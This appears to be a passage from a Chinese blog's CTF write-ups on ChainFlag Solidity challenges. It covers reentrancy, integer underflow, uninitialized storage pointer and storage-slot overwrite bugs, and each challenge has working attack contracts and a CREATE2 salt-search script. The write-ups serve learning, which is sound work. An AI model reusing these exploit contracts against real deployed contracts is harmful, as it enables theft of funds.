create2(0, add(bytecode, 0x20), mload(bytecode), salt) &#125; &#125; function sendMoney(address payable to) external payable &#123; selfdestruct(to); &#125;&#125; cow1. question源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374pragma solidity ^0.4.2;contract cow&#123; address public owner_1; address public owner_2; address public owner_3; address public owner; mapping(address =&gt; uint) public balance; struct hacker &#123; address hackeraddress1; address hackeraddress2; &#125; hacker h; constructor()public&#123; owner = msg.sender; owner_1 = msg.sender; owner_2 = msg.sender; owner_3 = msg.sender; &#125; event SendFlag(string b64email); function payforflag(string b64email) public &#123; require(msg.sender==owner_1); require(msg.sender==owner_2); require(msg.sender==owner_3); owner.transfer(address(this).balance); emit SendFlag(b64email); &#125; function Cow() public payable &#123; uint geteth=msg.value/1000000000000000000; if (geteth==1) &#123; owner_1=msg.sender; &#125; &#125; function cov() public payable &#123; uint geteth=msg.value/1000000000000000000; if (geteth&lt;1) &#123; hacker fff=h; fff.hackeraddress1=msg.sender; &#125; else &#123; fff.hackeraddress2=msg.sender; &#125; &#125; function see() public payable &#123; uint geteth=msg.value/1000000000000000000; balance[msg.sender]+=geteth; if (uint(msg.sender) &amp; 0xffff == 0x525b) &#123; balance[msg.sender] -= 0xb1b1; &#125; &#125; function buy_own() public &#123; require(balance[msg.sender]&gt;1000000); balance[msg.sender]=0; owner_3=msg.sender; &#125; &#125; 📌 成功调用payforflag() 2. analysis 做法：逐步占领各个owner Cow()：成为owner_1 cov()：成为owner_2，不能走if语句，因为无法覆盖到slot0的位置，前面有类似的题，只有在函数体中声明storage类型的结构体才会进行覆盖，如果在函数体外声明，EVM则会事先给结构体开辟空间。 buy_own()：成为owner_3，但是需要先通过see()使balance[msg.sender]发生下溢 3. solve攻击合约 123456789101112131415161718192021222324252627282930313233343536373839pragma solidity ^0.8.0;interface Icow &#123; function Cow() external payable; function cov() external payable; function see() external payable; function buy_own() external; function payforflag(string memory b64email) external;&#125;contract CowHacker &#123; Icow cow; function attack(address _cow) public payable &#123; require(msg.value == 3 ether, &quot;msg.value less than 3 ether&quot;); cow = Icow(_cow); cow.Cow&#123;value : 1 ether&#125;(); // 成为owner_1 cow.cov&#123;value : 1 ether&#125;(); // 成为owner_2 cow.see&#123;value : 1 ether&#125;(); // balance[msg.sender] 发生溢出 cow.buy_own(); // 成为owner_3 cow.payforflag(&quot;hacker&quot;); &#125; receive() external payable&#123;&#125;&#125;contract Deployer &#123; function deploy(uint _salt) public returns(address)&#123; bytes memory bytecode = type(CowHacker).creationCode; bytes32 salt = keccak256(abi.encodePacked(_salt)); address addr; assembly &#123; addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt) &#125; return addr; &#125;&#125; rise1. question源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899pragma solidity ^0.4.2;contract rise &#123; address referee; uint secret; uint bl; mapping(address =&gt; uint) public balance; mapping(address =&gt; uint) public gift; address owner; struct hacker &#123; address hackeraddress; uint value; &#125; constructor()public&#123; owner = msg.sender; referee = msg.sender; balance[msg.sender]=10000000; bl=1; secret=18487187377722; &#125; event SendFlag(string b64email); modifier onlyOwner()&#123; require(msg.sender == owner); _; &#125; modifier onlyRefer()&#123; require(msg.sender == referee); _; &#125; function payforflag(string b64email) public &#123; require(balance[msg.sender]&gt;1000000); balance[msg.sender]=0; bl=1; owner.transfer(address(this).balance); emit SendFlag(b64email); &#125; function airdrop() public &#123; require(gift[msg.sender]==0); gift[msg.sender]==1; balance[msg.sender]+=1; &#125; function deposit() public payable &#123; uint geteth=msg.value/1000000000000000000; balance[msg.sender]+=geteth; &#125; function set_secret(uint target_secret) public onlyOwner &#123; secret=target_secret; &#125; function set_bl(uint target_bl) public onlyRefer &#123; bl=target_bl; &#125; function risegame(uint guessnumber) public payable &#123; require(balance[msg.sender]&gt;0); uint geteth=msg.value/1000000000000000000; if (guessnumber==secret) &#123; balance[msg.sender]+=geteth*bl; bl=1; &#125; else &#123; balance[msg.sender]=0; bl=1; &#125; &#125; function transferto(address to) public &#123; require(balance[msg.sender]&gt;0); if (to !=0) &#123; balance[to]=balance[msg.sender]; balance[msg.sender]=0; &#125; else &#123; hacker storage h; h.hackeraddress=msg.sender; h.value=balance[msg.sender]; balance[msg.sender]=0; &#125; &#125; &#125; 📌 成功调用payforflag() 2. analysis airdrop()：空投函数，使balance[msg.sender] != 0 deposit()：再次为了balance[msg.sender] != 0 transferto()：成为referee，并将secret设置为1 set_bl：提高倍率 risegame：将balance升高 3. solve攻击合约 1234567891011121314151617181920contract Hacker &#123; rise rise_; constructor(address _rise) public &#123; rise_ = rise(_rise); &#125; function attack() public payable &#123; require(msg.value == 2 ether); rise_.airdrop(); // 获取空投 rise_.transferto(address(0)); // 成为referee，设置密码为1 rise_.deposit.value(1 ether)(); // 使 balance[msg.sender] != 0 rise_.set_bl(1000001); // 使 b1的值变大 rise_.risegame.value(1 ether)(1); // 为了满足 1 * 1000001 &gt; 1000000 rise_.payforflag(&quot;hacker&quot;); &#125; function() external payable&#123;&#125;&#125; roiscoin1. question源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697pragma solidity ^0.4.23;contract FakeOwnerGame &#123; event SendFlag(address _addr); uint randomNumber = 0; uint time = now; mapping (address =&gt; uint) public BalanceOf; mapping (address =&gt; uint) public WinCount; mapping (address =&gt; uint) public FailCount; bytes32[] public codex; address private owner; uint256 settlementBlockNumber; address guesser; uint8 guess; struct FailedLog &#123; uint failtag; uint failtime; uint success_count; address origin; uint fail_count; bytes12 hash; address msgsender; &#125; mapping(address =&gt; FailedLog[]) FailedLogs; constructor() &#123; owner = msg.sender; &#125; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; function payforflag() onlyOwner &#123; require(BalanceOf[msg.sender] &gt;= 2000); emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125; function lockInGuess(uint8 n) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = n; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2; if (guess == answer) &#123; WinCount[msg.sender] += 1; BalanceOf[msg.sender] += 1000; &#125; else &#123; FailCount[msg.sender] += 1; &#125; if (WinCount[msg.sender] == 2) &#123; if (WinCount[msg.sender] + FailCount[msg.sender] &lt;= 2) &#123; guesser = 0; WinCount[msg.sender] = 0; FailCount[msg.sender] = 0; msg.sender.transfer(address(this).balance); &#125; else &#123; FailedLog failedlog; failedlog.failtag = 1; failedlog.failtime = now; failedlog.success_count = WinCount[msg.sender]; failedlog.origin = tx.origin; failedlog.fail_count = FailCount[msg.sender]; failedlog.hash = bytes12(sha3(WinCount[msg.sender] + FailCount[msg.sender])); failedlog.msgsender = msg.sender; FailedLogs[msg.sender].push(failedlog); &#125; &#125; &#125; function beOwner() payable &#123; require(address(this).balance &gt; 0); if(msg.value &gt; address(this).balance)&#123; owner = msg.sender; &#125; &#125; function revise(uint idx, bytes32 tmp) &#123; if(uint(msg.sender) &amp; 0x61 == 0x61 &amp;&amp; tx.origin != msg.sender) &#123; codex[idx] = tmp; &#125; &#125;&#125; 📌 成功调用payforflag() 2. analysis 这道题很奈斯！ 要求成为owner，并且BalanceOf[msg.sender] &gt;= 2000。 分析 lockInGuess()：锁定guess，并成为猜题人（为了成功调用settle） settle()：能够进行一些变量的覆盖，尤其重要的是数组codex的长度，为了能进行变量覆盖，必须进入到如下的else语句中 123456if (WinCount[msg.sender] == 2) &#123; if ()&#123; ... &#125; else &#123; // 这里别有一番天地 &#125; 所以这便要求了猜题的次数分配如：必须猜对两次，且猜错的次数大于等于1 当属最难便是对于数组长度的覆盖😭😭😭 123456789// 在FailedLog 结构体中,这两个值占用的空间刚好为 32bytes bytes12 hash; address msgsender;// 这两个值进行插槽覆盖的时候，便是对数组 codex 的长度进行覆盖，// 而且这很有意思，高20位为`msg.sender`，低12bytes位为`bytes12(...)`// 我的理解是先正常将bytes12(...)放进slot中，后发现address类型仍可以在该slot中存储，便将前20bytes位用于存放msg.senderfailedlog.hash = bytes12(sha3(WinCount[msg.sender] + FailCount[msg.sender]));failedlog.msgsender = msg.sender; 通过计算可知，从codex[0]到存储owner变量的”距离”为 owner_index codex_length &#x3D; 114245411204874937970903528273105092893277201882823832116766311725579567940175 123uint codex_0 = uint(keccak256(abi.encodePacked(uint(5)))); // codex[0]所在位置uint codex_length = type(uint256).max - codex_0; // codex数组到EVM存储空间末尾的距离uint owner_index = codex_length + 7; // 变量owner相对于数组的位置 通过实践可以发现，只要msg.sender是以ff或fe开头的地址，那么他们拼凑出来的值便会大于codex_length。 最后，最离谱的是，里面有个骗子函数beOwner() 这就是个无底洞，永远也无法从该函数成为owner，不信你来试试看。 3. solve计算脚本： 123456789101112131415161718192021222324252627282930import &#123; ethers &#125; from &quot;ethers&quot;const const_num = &quot;0xFF&quot;;const contract_add = &quot;&quot;; // depolyer&#x27;addresslet str1 = const_num + contract_add.slice(2,contract_add.length);const bytecode = &quot;&quot;; // hacker&#x27;bytecodeconst bytecodeToHash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;],[bytecode]);let salt = 0;while (true) &#123; let saltToHash = ethers.utils.solidityKeccak256([&#x27;uint&#x27;],[salt]); saltToHash = saltToHash.slice(2, saltToHash.length) let str2 = str1.concat(saltToHash).concat(bytecodeToHash.slice(2,bytecodeToHash.length)); let hash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;] ,[str2]); if ((hash.slice(26, 28) == &quot;ff&quot; || hash.slice(26, 28) == &quot;fe&quot; ) &amp;&amp; hash.slice(hash.length - 2, hash.length) == &quot;61&quot;) &#123; console.log(`salt = $&#123;salt&#125;`); console.log(`address = 0x$&#123;hash.slice(26, hash.length)&#125;`); break; &#125; salt++;&#125; 攻击合约 攻击逻辑：先通过脚本计算出来的盐部署出hacker合约的实例，①调用hacker的attack1()函数，并支付1 ethter；②一直调用attack2()函数（可能会出现调用失败的情况但是不影响，只要一直调用便会正常），直到wintimes == 2，failtimes &gt;= 1为止；③调用attack3()函数，即完成攻击 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081pragma solidity ^0.8.0;interface IFakeOwnerGame&#123; function lockInGuess(uint8 n) external payable; function settle() external; function payforflag() external; function revise(uint idx, bytes32 tmp) external;&#125;contract FakeOwnerGameHack&#123; IFakeOwnerGame game; address owner; uint public wintimes; uint public failtimes; constructor() &#123; owner = msg.sender; &#125; function attack1(address _game) public payable &#123; require(msg.value == 1 ether, &quot;msg.value != 1 ether&quot;); game = IFakeOwnerGame(_game); game.lockInGuess&#123;value:1 ether&#125;(1); &#125; // 多次调用该函数，直到 wintimes == 2，且failtimes不为0 function attack2() external &#123; uint8 answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 2; if (answer == 1) &#123; if (wintimes == 2) return; game.settle(); game.settle(); wintimes += 2; &#125; else &#123; game.settle(); failtimes++; &#125; if (wintimes == 2) &#123; require(failtimes != 0, &quot;failtimes is zero,try again...&quot;); &#125; &#125; function attack3() public &#123; // beOwner()函数简直就是赤裸裸的诈骗啊！！！ // game.beOwner&#123;value: msg.value&#125;(); uint codex_0 = uint(keccak256(abi.encodePacked(uint(5)))); // codex[0]所在位置 uint codex_length = type(uint256).max - codex_0; // codex数组到EVM存储空间末尾的距离 uint owner_index = codex_length + 7; // 变量owner相对于数组的位置 game.revise(owner_index, bytes32(uint(uint160(address(this))))); // 成为owner // 夺旗 game.payforflag(); &#125; receive() external payable &#123; // 用于将钱转回 EOA 可加可不加 //(bool success, ) = owner.call&#123;value:address(msg.sender).balance&#125;(&quot;&quot;); &#125;&#125;contract Deployer &#123; function deploy(uint _salt) public returns(address)&#123; bytes memory bytecode = type(FakeOwnerGameHack).creationCode; bytes32 salt = keccak256(abi.encodePacked(_salt)); address addr; assembly &#123; addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt) &#125; return addr; &#125; function pay(address payable to) public payable &#123; selfdestruct(to); &#125;&#125; Bank1. question源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879pragma solidity ^0.4.24;contract Bank &#123; event SendEther(address addr); event SendFlag(address addr); address public owner; uint randomNumber = 0; constructor() public &#123; owner = msg.sender; &#125; struct SafeBox &#123; bool done; function(uint, bytes12) internal callback; bytes12 hash; uint value; &#125; SafeBox[] safeboxes; struct FailedAttempt &#123; uint idx; uint time; bytes12 triedPass; address origin; &#125; mapping(address =&gt; FailedAttempt[]) failedLogs; modifier onlyPass(uint idx, bytes12 pass) &#123; if (bytes12(sha3(pass)) != safeboxes[idx].hash) &#123; FailedAttempt info; info.idx = idx; info.time = now; info.triedPass = pass; info.origin = tx.origin; failedLogs[msg.sender].push(info); &#125; else &#123; _; &#125; &#125; function deposit(bytes12 hash) payable public returns(uint) &#123; SafeBox box; box.done = false; box.hash = hash; box.value = msg.value; if (msg.sender == owner) &#123; box.callback = sendFlag; &#125; else &#123; require(msg.value &gt;= 1 ether); box.value -= 0.01 ether; box.callback = sendEther; &#125; safeboxes.push(box); return safeboxes.length-1; &#125; function withdraw(uint idx, bytes12 pass) public payable &#123; SafeBox box = safeboxes[idx]; require(!box.done); box.callback(idx, pass); box.done = true; &#125; function sendEther(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123; msg.sender.transfer(safeboxes[idx].value); emit SendEther(msg.sender); &#125; function sendFlag(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123; require(msg.value &gt;= 100000000 ether); emit SendFlag(msg.sender); selfdestruct(owner); &#125;&#125; 📌 成功调用sendFlag()，也可以理解为触发SendFlag事件。 2. analysis 观察可发现在deposit函数和onlyPass装饰器中均存在未初始化存储指针漏洞。 结合布局来看，deposit函数中的box结构体可以改写owner和randomNumber。如果能将owner改为attacker的地址，就可以将box的回调设置为sendFlag函数，从而调用，但仍然绕不过msg.value &gt;= 100000000 ether的限制，因此不可行。 而onlyPass中的FailedAttemp结构体还可改写safeboxes数组的长度。若改写长度为n，则withdraw函数执行回调时即可直接访问safeboxes[i] (i&lt;n)。同时由于FailedAttempt中的triedPass这12个字节是可控的，因此只要找到safeboxes[i] -&gt; FailedAttempt.treidPass，再设置好合适的treidPass数据，即可通过box[i]的回调直接跳转到触发SendFlag事件的代码继续执行。 通过反编译可以找到 emit SendFlag(msg.sender);的地址为：0x070F 合约的slot存储布局如下： 123456789-----------------------------------------------------| unused (12) | owner (20) | &lt;- slot 0-----------------------------------------------------| randomNumber (32) | &lt;- slot 1-----------------------------------------------------| safeboxes.length (32) | &lt;- slot 2-----------------------------------------------------| occupied by failedLogs but unused (32) | &lt;- slot 3----------------------------------------------------- safebox存储布局如下： 12345-----------------------------------------------------| unused (11) | hash (12) | callback (8) | done (1) |-----------------------------------------------------| value (32) |----------------------------------------------------- faillog存储布局如下： 1234567-----------------------------------------------------| idx (32) |-----------------------------------------------------| time (32) |-----------------------------------------------------| origin (20) | triedPass (12) |----------------------------------------------------- 首先，要制造出进入onlyPass的条件入口，指通过deposit函数将callback设置成sendEther才可以。 引用大佬的分析： 123456789101112131415161718FailedLogs[0] = keccak256(0||3)FailedLogs[msg.sender] = keccak256(msg.sender||3)keccak256(msg.sender||3) = FailedAttempt.lengthFailedAttempt[0] = keccak256(keccak256(msg.sender||3)) + 0*3FailedAttempt[0].triedPass = keccak256(keccak256(msg.sender||3)) + 2// 这是safebox的计算式box[0] = keccak256(2)box[i] = keccak256(2) + i*2// 如何让box[i] 读取到 FailedAttempt[0].triedPass的值box[i] -&gt; FailedAttempt[0].triedPasskeccak256(2) + i*2 = keccak256(keccak256(msg.sender||3)) + 2i = (keccak256(keccak256(msg.sender||3)) + 2 - keccak256(2)) / 2i = (failedAttempAddr + 2 - boxAddr) / 2 分析：因为 SafeBox 结构体占两个 slot，所以 safeboxes[i] 的存储位置为：keccak(2) + i * 2 ； 同理FailedAttempt数组也是一样的，不过其占用的是三个slot，而FailedAttempt[0].triedPass的位置在keccak256(keccak256(msg.sender||3)) + 2，所以就有了idx的计算式如下： 123keccak256(2) + i*2 = keccak256(keccak256(msg.sender||3)) + 2i = (keccak256(keccak256(msg.sender||3)) + 2 - keccak256(2)) / 2i = (failedAttempAddr + 2 - boxAddr) / 2 helper合约就是用于计算使用的。 这里还需要注意的是：i &lt; boxLength，即i &lt; msg.sender||triedPass，还要判断是否可以整除2，若不能整除则也不符合要求，box[i]会指向time字段。故对attacker的地址也有所限制。 至于为什么要整除2呢，我的理解是，首先在solidity中对小数采取舍弃的方法，那么，比如 在 slot1，slot2，slot3中，我要跳转到，slot2的位置， 3. solve攻击合约 tx.origin&#x3D;0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657contract BankHacker &#123; Bank bank; constructor (address _bank) public &#123; bank = Bank(_bank); &#125; function pwn() public payable &#123; require(msg.value &gt;= 1 ether, &quot;You must pay 1 ether&quot;); // 1. make id[0].callback = sendEther to into onlyPass bank.deposit.value(1 ether)(bytes12(uint96(0))); // parameter is arbitrary // 2. cover the box[i]&#x27;s callback, pass: 000000000000070F00 bank.withdraw(0, 0x999999000000000000070F00); // 3. calculate the idx uint idx = (new BankHelper()).calIdx(address(this)); // the address is address(this)!!!! // 4. capture the falg bank.withdraw(idx, bytes12(uint96(0))); &#125;&#125;contract BankHelper &#123; // 计算出 FailedAttempt[0] function calFailedAttempt_0(address addr) public pure returns(uint) &#123; return uint(keccak256(keccak256(abi.encodePacked(bytes32(addr), bytes32(3))))); &#125; // 计算出 safeboxes[0] function calBox_0() public pure returns(uint) &#123; return uint(keccak256(uint(2))); &#125; // 计算idx function calIdx(address hacker) public returns (uint) &#123; return (calFailedAttempt_0(hacker) + 2 - calBox_0()) / 2; &#125; // 确保length &gt; idx function compareLength(address hacker) public returns(bool) &#123; return bytes20(hacker) &gt; bytes20(bytes32(calIdx(hacker))); &#125; function isDivsibleBy2(address hacker) public returns(bool) &#123; return (calFailedAttempt_0(hacker) + 2 - calBox_0()) % 2 == 0; &#125; function uintTobytes32(uint num) public returns(bytes32)&#123; return bytes32(num); &#125;&#125; 总结 前四道题还好，最后一道就很有挑战性了，知道了如何计算组合型的变量的存储位置，如mapping(address&#x3D;&gt;struct)类型的。也为我以后做题提供了新思路，就是回归到底层，通过操作EVM来达到目的。","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"public_blockchain(2)❌","slug":"CTFS/ChainFlag/public blockchain/public_blockchain(2)","date":"2023-08-26T06:50:10.000Z","updated":"2023-08-26T06:50:10.000Z","comments":true,"path":"2023/08/26/CTFS/ChainFlag/public blockchain/public_blockchain(2)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/26/CTFS/ChainFlag/public%20blockchain/public_blockchain(2)/","excerpt":"","text":"这不是solidity，就不参合了🤪","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"reentrancy(2)","slug":"CTFS/ChainFlag/reentrancy/reentrancy(2)","date":"2023-08-26T01:50:10.000Z","updated":"2023-08-26T01:50:10.000Z","comments":true,"path":"2023/08/26/CTFS/ChainFlag/reentrancy/reentrancy(2)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/26/CTFS/ChainFlag/reentrancy/reentrancy(2)/","excerpt":"","text":"babybank1. question源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566pragma solidity ^0.4.23;contract babybank &#123; mapping(address =&gt; uint) public balance; mapping(address =&gt; uint) public level; address owner; uint secret; //Don&#x27;t leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough. //Gmail is ok. 163 and qq may have some problems. event sendflag(string md5ofteamtoken,string b64email); constructor()public&#123; owner = msg.sender; &#125; //pay for flag function payforflag(string md5ofteamtoken,string b64email) public&#123; require(balance[msg.sender] &gt;= 10000000000); balance[msg.sender]=0; owner.transfer(address(this).balance); emit sendflag(md5ofteamtoken,b64email); &#125; modifier onlyOwner()&#123; require(msg.sender == owner); _; &#125; //challenge 1 function profit() public&#123; require(level[msg.sender]==0); require(uint(msg.sender) &amp; 0xffff==0xb1b1); balance[msg.sender]+=1; level[msg.sender]+=1; &#125; //challenge 2 function set_secret(uint new_secret) public onlyOwner&#123; secret=new_secret; &#125; function guess(uint guess_secret) public&#123; require(guess_secret==secret); require(level[msg.sender]==1); balance[msg.sender]+=1; level[msg.sender]+=1; &#125; //challenge 3 function transfer(address to, uint amount) public&#123; require(balance[msg.sender] &gt;= amount); require(amount==2); require(level[msg.sender]==2); balance[msg.sender] = 0; balance[to] = amount; &#125; function withdraw(uint amount) public&#123; require(amount==2); require(balance[msg.sender] &gt;= amount); msg.sender.call.value(amount*100000000000000)(); balance[msg.sender] -= amount; &#125;&#125; 📌 成功调用payforflag() 2.analysis 一眼看出 系列为重入系列，最为明显的漏洞在于withdraw() 123456function withdraw(uint amount) public&#123; require(amount==2); require(balance[msg.sender] &gt;= amount); msg.sender.call.value(amount*100000000000000)(); balance[msg.sender] -= amount;&#125; 先转账再更新余额，经典重入 profit()通过create2计算地址，并获利 guess()使得balance[msg.sender] &#x3D;&#x3D; 2 在msg.sender的回调函数中调用一次转账操作，使得在 withdraw中发生下溢 还需要通过selfdestruct给题目合约强制赚钱，为了满足msg.sender.call.value(amount*100000000000000)(); 3. solve攻击逻辑：通过脚本语言计算出符合要求的hacker地址的salt，再通过Helper合约的deploy函数生成hacker，然后通过pay函数强制给bank转钱，根据地址生成hacker之后，调用attack函数即可完成攻击。 攻击合约 123456789101112131415161718192021222324252627282930313233343536373839404142pragma solidity ^0.8.0;interface babybank&#123; function payforflag(string memory, string memory) external; function profit() external; function guess(uint guess_secret) external; function transfer(address to, uint amount) external; function withdraw(uint amount) external; &#125;contract Hacker &#123; babybank bank; bool flag; function attack(address _bank, uint guess_secret) public &#123; bank = babybank(_bank); bank.profit(); bank.guess(guess_secret); bank.withdraw(2); bank.payforflag(&quot;HC&quot;, &quot;Hacker&quot;); &#125; fallback() external payable&#123; if (!flag) &#123; flag = true; bank.transfer(msg.sender, 2); &#125; &#125;&#125;contract Helper &#123; function deploy(uint _salt) public returns(address) &#123; address hacker = address(new Hacker&#123;salt : keccak256(abi.encodePacked(_salt))&#125;()); return hacker; &#125; function pay(address payable bank) public payable &#123; selfdestruct(bank); &#125;&#125; h4ck1. question源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135pragma solidity ^0.4.25;contract owned &#123; address public owner; constructor () public &#123; owner = msg.sender; &#125; modifier onlyOwner &#123; require(msg.sender == owner); _; &#125; function transferOwnership(address newOwner) public onlyOwner &#123; owner = newOwner; &#125;&#125;contract challenge is owned&#123; string public name; string public symbol; uint8 public decimals = 18; uint256 public totalSupply; mapping (address =&gt; uint256) public balanceOf; mapping (address =&gt; uint256) public sellTimes; mapping (address =&gt; mapping (address =&gt; uint256)) public allowance; mapping (address =&gt; bool) public winner; event Transfer(address _from, address _to, uint256 _value); event Burn(address _from, uint256 _value); event Win(address _address,bool _win); constructor ( uint256 initialSupply, string tokenName, string tokenSymbol ) public &#123; totalSupply = initialSupply * 10 ** uint256(decimals); balanceOf[msg.sender] = totalSupply; name = tokenName; symbol = tokenSymbol; &#125; function _transfer(address _from, address _to, uint _value) internal &#123; require(_to != address(0x0)); require(_value &gt; 0); uint256 oldFromBalance = balanceOf[_from]; uint256 oldToBalance = balanceOf[_to]; uint256 newFromBalance = balanceOf[_from] - _value; uint256 newToBalance = balanceOf[_to] + _value; require(oldFromBalance &gt;= _value); require(newToBalance &gt; oldToBalance); balanceOf[_from] = newFromBalance; balanceOf[_to] = newToBalance; assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance)); emit Transfer(_from, _to, _value); &#125; function transfer(address _to, uint256 _value) public returns (bool success) &#123; _transfer(msg.sender, _to, _value); return true; &#125; function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) &#123; require(_value &lt;= allowance[_from][msg.sender]); allowance[_from][msg.sender] -= _value; _transfer(_from, _to, _value); return true; &#125; function approve(address _spender, uint256 _value) public returns (bool success) &#123; allowance[msg.sender][_spender] = _value; return true; &#125; function burn(uint256 _value) public returns (bool success) &#123; require(balanceOf[msg.sender] &gt;= _value); balanceOf[msg.sender] -= _value; totalSupply -= _value; emit Burn(msg.sender, _value); return true; &#125; function balanceOf(address _address) public view returns (uint256 balance) &#123; return balanceOf[_address]; &#125; function buy() payable public returns (bool success)&#123; require(balanceOf[msg.sender]==0); require(msg.value == 1 wei); _transfer(address(this), msg.sender, 1); sellTimes[msg.sender] = 1; return true; &#125; function sell(uint256 _amount) public returns (bool success)&#123; require(_amount &gt;= 100); require(sellTimes[msg.sender] &gt; 0); require(balanceOf[msg.sender] &gt;= _amount); require(address(this).balance &gt;= _amount); msg.sender.call.value(_amount)(); _transfer(msg.sender, address(this), _amount); sellTimes[msg.sender] -= 1; return true; &#125; function winnerSubmit() public returns (bool success)&#123; require(winner[msg.sender] == false); require(sellTimes[msg.sender] &gt; 100); winner[msg.sender] = true; emit Win(msg.sender,true); return true; &#125; function kill(address _address) public onlyOwner &#123; selfdestruct(_address); &#125; function eth_balance() public view returns (uint256 ethBalance)&#123; return address(this).balance; &#125; &#125; 📌 成功调用winnerSubmit() 2.analysis winnerSubmit()要求require(sellTimes[msg.sender] &gt; 100);而涉及到sellTimes[]的函数为sell()观察该函数有明显的重入风险 12345678910function sell(uint256 _amount) public returns (bool success)&#123; require(_amount &gt;= 100); require(sellTimes[msg.sender] &gt; 0); require(balanceOf[msg.sender] &gt;= _amount); require(address(this).balance &gt;= _amount); msg.sender.call.value(_amount)(); _transfer(msg.sender, address(this), _amount); sellTimes[msg.sender] -= 1; return true;&#125; sellTimes[msg.sender] -= 1;在执行转账操作之后再更新，而且断言require(sellTimes[msg.sender] &gt; 0);要求其值必须大于0，而能增加该值的函数为buy()函数，但其函数要求余额必须为0且执行之后sellTimes[msg.sender]只能为1。所以sell()中的require(sellTimes[msg.sender] &gt; 0);可以满足，再看到require(balanceOf[msg.sender] &gt;= _amount);，要求balance需要大于amount，能改变该值的同样buy()也可以。分析_transfer()函数： 12345678910111213141516171819function _transfer(address _from, address _to, uint _value) internal &#123; require(_to != address(0x0)); require(_value &gt; 0); uint256 oldFromBalance = balanceOf[_from]; uint256 oldToBalance = balanceOf[_to]; uint256 newFromBalance = balanceOf[_from] - _value; uint256 newToBalance = balanceOf[_to] + _value; require(oldFromBalance &gt;= _value); require(newToBalance &gt; oldToBalance); balanceOf[_from] = newFromBalance; balanceOf[_to] = newToBalance; assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance)); emit Transfer(_from, _to, _value);&#125; 很明显，有个漏洞，即：自己给自己转钱可以获得双倍的钱。 so，可以通过buy()获取 1banlance，然后重复给自己转钱，转 2 ^ 8 &#x3D;&#x3D; 256 &gt; 200即可。为什么要转八次呢，继续分析。 因为，要使require(sellTimes[msg.sender] &gt; 100);毫无疑问溢出来的最快，而msg.sender.call.value(_amount)();则完美的给我们提供了溢出的可行性，即两次调用sell()函数，在第一次sellTimes[msg.sender] == 1的时候通过回调函数调用sell，此时在攻击合约的回调函数中再次执行sell，攻击合约中执行完回调函数中的sell()时，sellTimes[msg.sender]已经为0，而此时代码回到最初的sell()函数中，这样一来就可以通过0 - 1实现溢出。所以需要执行两次sell()函数，要求address(this).balance &gt;= 200，balanceOf[msg.sender] &gt;= 200。 3. solve攻击逻辑：部署h4ck，往合约中转入至少1tokens（我觉得题目本来就应该有tokens，不然函数sell()无法执行），部署hacker，进行攻击 攻击合约 1234567891011121314151617181920212223242526272829303132333435contract Hacker &#123; challenge challenge_; bool flag; constructor(address _challenge) public payable &#123; require(msg.value == 200 wei); challenge_ = challenge(_challenge); (new Helper).value(200 wei)(_challenge); &#125; function attack() public payable &#123; require(msg.value == 1 wei); challenge_.buy.value(1 wei)(); for (uint i; i &lt; 8; i++) &#123; challenge_.transfer(address(this), challenge_.balanceOf(address(this))); &#125; challenge_.sell(100); require(challenge_.winnerSubmit(), &quot;you are not winner&quot;); &#125; function() external payable&#123; if (!flag) &#123; flag = true; challenge_.sell(100); &#125; &#125;&#125;contract Helper &#123; constructor(address _challenge) public payable &#123; selfdestruct(_challenge); &#125;&#125; 